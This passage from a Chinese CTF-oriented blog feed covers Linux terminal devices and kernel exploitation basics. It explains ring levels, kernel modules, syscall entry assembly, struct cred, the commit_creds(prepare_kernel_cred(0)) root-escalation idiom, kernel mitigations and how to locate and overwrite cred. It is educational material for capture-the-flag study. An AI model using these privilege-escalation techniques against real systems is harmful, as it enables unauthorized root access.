title="&#x2F;dev&#x2F;tty-控制终端"></a>&#x2F;dev&#x2F;tty-控制终端</h3><p><strong>当前进程</strong>的控制终端设备文件，类似于符号链接，会具体对应至某个实际终端文件</p><p>相关指令：</p><p><code>tty</code>：查看具体对应的终端设备</p><p><code>ps -ax</code>：查看进程与控制终端的映射关系</p><p><code>-append &#39;console=ttyS0</code>：<code>qemu</code>中设置 <code>linux kernel tty</code> 映射至 <code>/dev/ttySn</code> 上</p><h3 id="x2F-dev-x2F-ttyN-amp-x2F-dev-x2F-console-虚拟终端与控制台"><a href="#x2F-dev-x2F-ttyN-amp-x2F-dev-x2F-console-虚拟终端与控制台" class="headerlink" title="&#x2F;dev&#x2F;ttyN &amp; &#x2F;dev&#x2F;console-虚拟终端与控制台"></a>&#x2F;dev&#x2F;ttyN &amp; &#x2F;dev&#x2F;console-虚拟终端与控制台</h3><p>在<code>Linux</code> 系统中，计算机显示器通常被称为<strong>控制台终端</strong> (<code>Console</code>)，而在 <code>linux</code> <strong>初始字符界面</strong>下，为了同时处理多任务，自然需要多个终端的切换，这些终端由于是用软件来模拟以前硬件的方式，是虚拟出来的，因此也称为<strong>虚拟终端</strong></p><blockquote><p><strong>控制台是直接和计算机相连接的原生设备，终端是通过电缆、网络等等和主机连接的设备</strong></p></blockquote><p>我们日常所使用的图形界面下的终端，属于某个<strong>虚拟图形终端界面</strong>下的多个<strong>伪终端</strong>,可以通过 <code>Ctrl+Alt+Fx</code> （ <code>Fx</code> 表示切换至第 <strong><code>x</code></strong> 个终端，例如 <code>F1</code>）来切换虚拟终端，<code>tty0</code>是当前所使用虚拟终端的一个别名，系统所产生的信息会发送到该终端上，默认情况下，<code>F1-F6</code>均为字符终端界面，<code>F7-F12</code>为图形终端界面</p><h3 id="x2F-dev-x2F-pty-伪终端"><a href="#x2F-dev-x2F-pty-伪终端" class="headerlink" title="&#x2F;dev&#x2F;pty-伪终端"></a>&#x2F;dev&#x2F;pty-伪终端</h3><p><strong>伪终端(Pseudo Terminal)<strong>是成对的</strong>逻辑</strong>终端设备，其行为与普通终端非常相似，所不同的是伪终端没有对应的硬件设备，主要目的是实现双向信道，为其他程序提供终端形式的接口，当我们远程连接到主机时，与主机进行交互的终端的类型就是伪终端，而且日常使用的图形界面中的多个终端也全都是伪终端。</p><p>伪终端的两个终端设备分别称为 <code>master</code> 设备和 <code>slave</code> 设备，其中 <code>slave</code> 设备的行为与普通终端无异，当某个程序把某个 <code>master</code> 设备看作终端设备并进行读写，则该读写操作将实际反应至该逻辑终端设备所对应的另一个 <code>slave</code> 设备。通常 <code>slave</code> 设备也会被其他程序用于读写</p><h3 id="其他终端-（-x2F-dev-x2F-ttyprintk等）"><a href="#其他终端-（-x2F-dev-x2F-ttyprintk等）" class="headerlink" title="其他终端 （&#x2F;dev&#x2F;ttyprintk等）"></a>其他终端 （&#x2F;dev&#x2F;ttyprintk等）</h3><p>这类终端通常是用于特殊的目的，例如<code>/dev/ttyprintk</code>直接与内核缓冲区相连</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction">https://kiprey.github.io/2021/10/kernel_pwn_introduction</a></p><p><a href="https://bbs.kanxue.com/thread-276403.htm#msg_header_h2_5">https://bbs.kanxue.com/thread-276403.htm#msg_header_h2_5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;查看&lt;code&gt;boot.sh&lt;/code&gt;，开启了&lt;code&gt;smep&lt;/code&gt;用户代码不可执行&lt;/p&gt;
&lt;pre class=&quot;li</summary>
      
    
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/categories/kernel/"/>
    
    
    <category term="kernel" scheme="https://starrysky1004.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>kernel基础知识</title>
    <link href="https://starrysky1004.github.io/2024/03/12/kernel-ji-chu-zhi-shi/kernel-ji-chu-zhi-shi/"/>
    <id>https://starrysky1004.github.io/2024/03/12/kernel-ji-chu-zhi-shi/kernel-ji-chu-zhi-shi/</id>
    <published>2024-03-12T12:43:52.000Z</published>
    <updated>2024-03-12T13:41:35.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内核基础知识"><a href="#内核基础知识" class="headerlink" title="内核基础知识"></a>内核基础知识</h2><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><p>用于管理软件发出的数据<code>I/O</code>要求的程序，将要求转义为指令交给<code>CPU</code>和其他组件处理，包括<code> I/O</code>，权限控制，系统调用，进程管理，内存管理等，<strong>kernel 的 crash 通常会引起重启</strong></p><ul><li>控制并与硬件进行交互</li><li>提供应用能运行的环境</li></ul><h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><p><code>cpu</code>分为<code>ring 0-3</code>四个特权级别，<code>ring0</code>仅<code>os</code>使用，<code>ring3</code>所以程序可用，大多操作系统仅<code>ring0</code>和<code>ring3</code></p><h3 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h3><p>可加载核心模块 (或直接称为内核模块) ,是内核空间的可执行程序，包括<strong>驱动程序（设备驱动、文件系统驱动）和内核扩展模块</strong>,和用户态的可执行程序相同，<code>Linux</code> 下为 <code>ELF</code>，<code>Windows</code> 下为 <code>exe/dll</code>，<code>mac</code> 下为 <code>MACH-O</code></p><p><strong>模块</strong>可以被单独编译，但不能单独运行，运行时<strong>被链接到内核</strong>作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同</p><blockquote><p><code>Linux</code> 内核之所以提供模块机制，是因为它本身是一个单内核 (<code>monolithic kernel</code>)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h4 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h4><ul><li><strong>insmod</strong>: 将指定<strong>模块加载到内核</strong>中</li><li><strong>rmmod</strong>: 从内核中<strong>卸载指定模块</strong></li><li><strong>lsmod</strong>: <strong>列出</strong>已经加载的模块</li><li><strong>modprobe</strong>: <strong>添加或删除</strong>模块，加载模块时会查找依赖关系</li></ul><blockquote><p>大多数　<code>CTF</code> 中的 <code>kernel vulnerability</code> 也出现在 <code>LKM</code> 中。</p></blockquote><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，系统调用提供用户程序与操作系统间的接口，部分库函数实际上是对系统调用的封装</p><h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">NAME       ioctl <span class="token operator">-</span> control deviceSYNOPSIS       <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>       <span class="token keyword">int</span> <span class="token function">ioctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> request<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ioctl</code>也是一个系统调用，用于与设备通信</p><p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (<code>open</code>) 返回的文件描述符，第二个参数为用户程序对设备的<strong>控制命令</strong>，再后边的参数则是一些补充参数，与设备有关</p><blockquote><p>内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。对设备驱动的请求是一个以设备和请求号码为参数的 <code>ioctl</code> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用</p></blockquote><h3 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>当发生  <strong>系统调用</strong>， <strong>产生异常</strong> ， <strong>外设产生中断</strong> 等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li><p>通过 <code>swapgs</code> <strong>切换</strong> <code>gs</code> 段寄存器，将 <code>gs</code> 寄存器值和一个特定位置的值进行<strong>交换</strong>，目的是<strong>保存</strong> <code>gs</code> 值，同时将该位置的值作为内核执行时的 <code>gs</code> 值使用</p></li><li><p>将当前栈顶（<strong>用户空间栈顶</strong>）<strong>记录</strong>在 CPU 独占变量区域里，将 CPU 独占区域里记录的<strong>内核栈顶</strong>放入 <code>rsp/esp</code></p></li><li><p>通过 <code>push</code> 保存各寄存器值，具体的代码 如下:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"> ENTRY(entry_SYSCALL_64) &#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F; SWAPGS_UNSAFE_STACK &#x2F;* 保存栈值，并设置内核栈 *&#x2F; movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;&#x2F;* Construct struct pt_regs on stack *&#x2F;pushq  $__USER_DS      &#x2F;* pt_regs-&gt;ss *&#x2F;pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;pushq  %r11             &#x2F;* pt_regs-&gt;flags *&#x2F;pushq  $__USER_CS      &#x2F;* pt_regs-&gt;cs *&#x2F;pushq  %rcx             &#x2F;* pt_regs-&gt;ip *&#x2F;pushq  %rax             &#x2F;* pt_regs-&gt;orig_ax *&#x2F;pushq  %rdi             &#x2F;* pt_regs-&gt;di *&#x2F;pushq  %rsi             &#x2F;* pt_regs-&gt;si *&#x2F;pushq  %rdx             &#x2F;* pt_regs-&gt;dx *&#x2F;pushq  %rcx tuichu    &#x2F;* pt_regs-&gt;cx *&#x2F;pushq  $-ENOSYS        &#x2F;* pt_regs-&gt;ax *&#x2F;pushq  %r8              &#x2F;* pt_regs-&gt;r8 *&#x2F;pushq  %r9              &#x2F;* pt_regs-&gt;r9 *&#x2F;pushq  %r10             &#x2F;* pt_regs-&gt;r10 *&#x2F;pushq  %r11             &#x2F;* pt_regs-&gt;r11 *&#x2F;sub $(6*8), %rsp      &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过汇编指令判断是否为 <code>x32_abi</code></p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用</p></li></ol><h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 <code>gs</code> 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（<code>CS</code>, <code>eflags/rflags</code>, <code>esp/rsp</code> 等）</li></ol><h3 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h3><p><code>kernel</code> 用 <code>cred</code> 结构体记录了进程的权限等信息（<code>uid</code>，<code>gid</code> 等），每个进程中都有一个 <code>cred</code> 结构，如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">atomic_t</span>    usage<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span>    <span class="token class-name">atomic_t</span>    subscribers<span class="token punctuation">;</span>    <span class="token comment">/* number of processes subscribed */</span>    <span class="token keyword">void</span>        <span class="token operator">*</span>put_addr<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span>    magic<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC</span>  <span class="token expression"><span class="token number">0x43736564</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC_DEAD</span> <span class="token expression"><span class="token number">0x44656144</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token class-name">kuid_t</span>      uid<span class="token punctuation">;</span>        <span class="token comment">/* real UID of the task */</span>    <span class="token class-name">kgid_t</span>      gid<span class="token punctuation">;</span>        <span class="token comment">/* real GID of the task */</span>    <span class="token class-name">kuid_t</span>      suid<span class="token punctuation">;</span>       <span class="token comment">/* saved UID of the task */</span>    <span class="token class-name">kgid_t</span>      sgid<span class="token punctuation">;</span>       <span class="token comment">/* saved GID of the task */</span>    <span class="token class-name">kuid_t</span>      euid<span class="token punctuation">;</span>       <span class="token comment">/* effective UID of the task */</span>    <span class="token class-name">kgid_t</span>      egid<span class="token punctuation">;</span>       <span class="token comment">/* effective GID of the task */</span>    <span class="token class-name">kuid_t</span>      fsuid<span class="token punctuation">;</span>      <span class="token comment">/* UID for VFS ops */</span>    <span class="token class-name">kgid_t</span>      fsgid<span class="token punctuation">;</span>      <span class="token comment">/* GID for VFS ops */</span>    <span class="token keyword">unsigned</span>    securebits<span class="token punctuation">;</span> <span class="token comment">/* SUID-less security management */</span>    <span class="token class-name">kernel_cap_t</span>    cap_inheritable<span class="token punctuation">;</span> <span class="token comment">/* caps our children can inherit */</span>    <span class="token class-name">kernel_cap_t</span>    cap_permitted<span class="token punctuation">;</span>  <span class="token comment">/* caps we're permitted */</span>    <span class="token class-name">kernel_cap_t</span>    cap_effective<span class="token punctuation">;</span>  <span class="token comment">/* caps we can actually use */</span>    <span class="token class-name">kernel_cap_t</span>    cap_bset<span class="token punctuation">;</span>   <span class="token comment">/* capability bounding set */</span>    <span class="token class-name">kernel_cap_t</span>    cap_ambient<span class="token punctuation">;</span>    <span class="token comment">/* Ambient capability set */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>   jit_keyring<span class="token punctuation">;</span>    <span class="token comment">/* default keyring to attach requested                     * keys to */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span> __rcu <span class="token operator">*</span>session_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring inherited over fork */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>process_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this process */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>thread_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this thread */</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>request_key_auth<span class="token punctuation">;</span> <span class="token comment">/* assumed request_key authority */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SECURITY</span></span>    <span class="token keyword">void</span>        <span class="token operator">*</span>security<span class="token punctuation">;</span>  <span class="token comment">/* subjective LSM security */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">struct</span> <span class="token class-name">user_struct</span> <span class="token operator">*</span>user<span class="token punctuation">;</span>   <span class="token comment">/* real user ID subscription */</span>    <span class="token keyword">struct</span> <span class="token class-name">user_namespace</span> <span class="token operator">*</span>user_ns<span class="token punctuation">;</span> <span class="token comment">/* user_ns the caps and keyrings are relative to. */</span>    <span class="token keyword">struct</span> <span class="token class-name">group_info</span> <span class="token operator">*</span>group_info<span class="token punctuation">;</span>  <span class="token comment">/* supplementary groups for euid/fsgid */</span>    <span class="token keyword">struct</span> <span class="token class-name">rcu_head</span> rcu<span class="token punctuation">;</span>        <span class="token comment">/* RCU deletion hook */</span><span class="token punctuation">&#125;</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h3><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li><code>printf() -&gt; printk()</code>，但需要注意的是 <code>printk()</code> 不一定会把内容显示到终端上，但<strong>一定在内核缓冲区</strong>里，可以通过 <code>dmesg</code> 查看效果</li><li><code>memcpy() -&gt; copy_from_user()/copy_to_user()</code><ul><li><code>copy_from_user()</code> 将<strong>用户</strong>空间的数据传送到<strong>内核</strong>空间</li><li><code>copy_to_user() </code>     将<strong>内核</strong>空间的数据传送到<strong>用户</strong>空间</li></ul></li><li><code>malloc() -&gt; kmalloc()</code>，内核态的内存分配函数，和<code>malloc()</code>相似，但使用的是 <code>slab/slub 分配器</code></li><li><code>free() -&gt; kfree()</code>，同 <code>kmalloc()</code></li></ul><p>另外要注意的是，<code>kernel 管理进程,也记录了进程的权限</code>,<code>kernel </code>中改变权限的函数：</p><ul><li><strong>int commit_creds(struct cred *new)</strong></li><li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li></ul><p><em><u>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 <code>root</code> 权限，<code>0</code> 表示 以 <code>0</code> 号进程作为参考准备新的 <code>credentials</code></u></em></p><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">grep</span> commit_creds /proc/kallsyms ffffffffbb6af9e0 T commit_credsffffffffbc7cb3d0 r __ksymtab_commit_credsffffffffbc7f06fe r __kstrtab_commit_creds$ <span class="token function">sudo</span> <span class="token function">grep</span> prepare_kernel_cred /proc/kallsymsffffffffbb6afd90 T prepare_kernel_credffffffffbc7d4f20 r __ksymtab_prepare_kernel_credffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一般情况下，<code>/proc/kallsyms</code> 的内容需要 <code>root</code> 权限才能查看</p></blockquote><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><blockquote><p><code>canary</code>, <code>dep</code>, <code>PIE</code>, <code>RELRO</code> 等保护与用户态原理和作用相同</p></blockquote><ul><li><code>smep</code>: <code>Supervisor Mode Execution Protection</code>，当处理器处于 <code>ring0</code> 模式，<strong>执行</strong>用户空间的代码会触发页错误。（在 <code>arm</code> 中该保护称为 <code>PXN</code>）</li><li><code>smap</code>: <code>Superivisor Mode Access Protection</code>，类似于 <code>smep</code>，通常是在<strong>访问数据</strong>时</li><li><code>mmap_min_addr</code></li></ul><h3 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h3><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="题目文件"></a>题目文件</h4><ol><li><p><code>boot.sh</code>: 一个用于启动 <code>kernel</code> 的 <code>shell</code> 的脚本，多用 <code>qemu</code>，保护措施与 <code>qemu</code> 不同的启动参数有关</p></li><li><p><code>bzImage</code>: <code>kernel binary</code></p></li><li><p><code>rootfs.cpio</code>: 文件系统映像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$x</span> babydriver.tarboot.shbzImagerootfs.cpio<span class="token variable">$file</span> bzImagebzImage: Linux kernel x86 boot executable bzImage, version <span class="token number">4.4</span>.72 <span class="token punctuation">(</span>atum@ubuntu<span class="token punctuation">)</span> <span class="token comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span><span class="token variable">$file</span> rootfs.cpiorootfs.cpio: <span class="token function">gzip</span> compressed data, last modified: Tue Jul  <span class="token number">4</span> 08:39:15 <span class="token number">2017</span>, max compression, from Unix, original size <span class="token number">2844672</span><span class="token variable">$file</span> boot.shboot.sh: Bourne-Again shell script, ASCII text executable<span class="token variable">$bat</span> boot.sh ───────┬────────────────────────────────────────────────────────────       │ File: boot.sh───────┼───────────────────────────────────────────────────────────         <span class="token comment">#!/bin/bash</span>         qemu-system-x86_64 <span class="token punctuation">\</span>         <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>         <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>         <span class="token parameter variable">-append</span> <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> <span class="token punctuation">\</span>         -enable-kvm <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>         <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>         <span class="token parameter variable">--nographic</span>  <span class="token punctuation">\</span>         <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>         <span class="token parameter variable">-cpu</span> kvm64,+smep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>-initrd rootfs.cpio</code>，使用<code>rootfs.cpio</code>作为内核启动的文件系统</li><li><code>-kernel bzImage</code>，使用 <code>bzImage</code> 作为 <code>kernel</code> 映像</li><li><code>-cpu kvm64,+smep</code>，设置 <code>CPU</code> 的安全选项，这里开启了 <code>smep</code></li><li><code>-m 64M</code>，设置虚拟 <code>RAM</code> 为 <code>64M</code>，默认为 <code>128M</code></li></ul><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><p><code>KASLR</code>：内核地址随机化，相当于<code>ASLR</code>(并非默认启用，需要在内核命令行中加入<code>kaslr</code>开启)</p><p><code>SMEP/SMAP</code>：[<code>SMEP</code>管理模式<strong>执行</strong>保护，禁止<strong>内核访问用户</strong>空间的数据]，[<code>SMAP</code>管理模式<strong>访问</strong>保护，类似于<code>NX</code>，即<strong>内核态无法执行<code>shellcode</code></strong>]</p><p><code>Stack Protector</code>：(<code>canary</code>)在编译内核时设置<code>CONFIG_CC_STACKPROTECTOR</code>，开了这个保护再编译驱动会有<code>canary</code></p><p><code>KPTI</code>：<code>KPTI</code>即内核页表隔离(<code>Kernel page-table isolation</code>)，内核空间与用户空间分别使用两组不同的页表集，这对于内核的<strong>内存管理</strong>产生了根本性的变化</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li>解包<code>rootfs</code>,检查保护</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> File_system$ <span class="token function">mv</span> rootfs.cpio ./File_system/rootfs.cpio.gz$ <span class="token builtin class-name">cd</span> File_system$ gunzip rootfs.cpio.gz$ cpio <span class="token parameter variable">-idmv</span> <span class="token operator">&lt;</span> rootfs.cpio$ <span class="token function">file</span> babydriver.ko $ checksec <span class="token parameter variable">--file</span><span class="token operator">=</span>babydriver.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.拖进<code>IDA</code>在内核代码中找到漏洞</p><p>3.利用<code>Shellcode</code>, <code>ROP</code>, 等攻击方式实现代码执行</p><p>4.提权</p><p>5.本地写好 <code>exploit</code> 后，可以通过 <code>base64</code> 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到<code> flag</code>，同时可以使用 <code>musl</code>, <code>uclibc</code> 等方法减小 <code>exploit</code> 的体积方便传输</p><p>测试<code>exp</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cp</span> ./exp ./fs <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> fs$ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio <span class="token parameter variable">-o</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.cpio <span class="token comment"># 重新打包文件系统</span>$ ./boot.sh <span class="token comment"># 启动&amp;测试exp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>即获取到 <code>root</code> 权限</p><h4 id="改变自身"><a href="#改变自身" class="headerlink" title="改变自身"></a>改变自身</h4><p>通过改变自身进程的权限，使其具有 root 权限,内核会通过进程的 <code>task_struct</code> 结构体中的 <code>cred</code> 指针来索引 <code>cred</code> 结构体，<code>cred</code>结构体成员中的 <code>uid-fsgid</code> 都为 <code>0</code>则具有 <code>root </code>权限,这种提权方法分为定位和修改两个步骤，<code>cred</code>结构体在<code>include/linux/cred.h</code></p><h5 id="直接改cred结构体的内容"><a href="#直接改cred结构体的内容" class="headerlink" title="直接改cred结构体的内容"></a>直接改cred结构体的内容</h5><h6 id="定位cred具体位置"><a href="#定位cred具体位置" class="headerlink" title="定位cred具体位置"></a>定位cred具体位置</h6><ul><li><p>直接定位</p><p><code>cred</code> 结构体的最前面记录了各种<code> id</code> 信息，对于一个普通的进程而言，<code>uid-fsgid</code> 都是执行进程的用户的身份,因此可以通过<strong>扫描内存</strong>来定位 <code>cred</code></p><p><strong>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。</strong>可以利用 <code>usage</code> 不为 <code>0</code> 来筛除掉一些 <code>cred</code>，但仍然会发现一些 <code>usage</code> 为 <code>0</code> 的 <code>cred</code>,这是因为 <code>cred</code> 从 <code>usage</code> 为 <code>0</code>， 到释放有一定的时间,此外，<code>cred</code> 是使用 <code>rcu</code> <strong>延迟释放</strong>的</p></li><li><p>间接定位</p><ul><li><p><code> task_struct</code></p><p>进程的 <code>task_struct</code> 结构体中会存放指向 <code>cred</code> 的指针，因此我们可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据<code> cred</code> 指针相对于 <code>task_struct</code> 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li><li>获取 <code>cred</code> 具体的地址</li></ol></li><li><p><code>comm</code></p><p><code>comm </code>用来标记可执行<strong>文件的名字</strong>，位于进程的 <code>task_struct</code> 结构体中, <code>comm</code> 在 <code>cred</code> 的正下方，所以可以先定位 <code>comm </code>，然后定位 <code>cred</code> 的地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>ptracer_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>real_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>cred<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>          <span class="token operator">*</span>cached_requested_key<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">char</span>                comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进程名字并不特殊的情况下可能会有多个同样的字符串，,可以使用 <code>prctl</code> 设置进程的<code>comm</code>为一个特殊的字符串，然后再开始定位 <code>comm</code></p></li></ul></li><li><p>修改</p><p>直接将 <code>cred</code> 中的 <code>uid-fsgid</code> 都修改为 <code>0</code>,当然修改的方式有很多种</p><ul><li><p>在我们具有任意地址读写后，可以直接修改 <code>cred</code></p></li><li><p>在我们可以 <code>ROP</code> 执行代码后，可以利用 <code>ROP gadget</code> 修改 <code>cred</code></p></li></ul></li></ul><h6 id="间接定位"><a href="#间接定位" 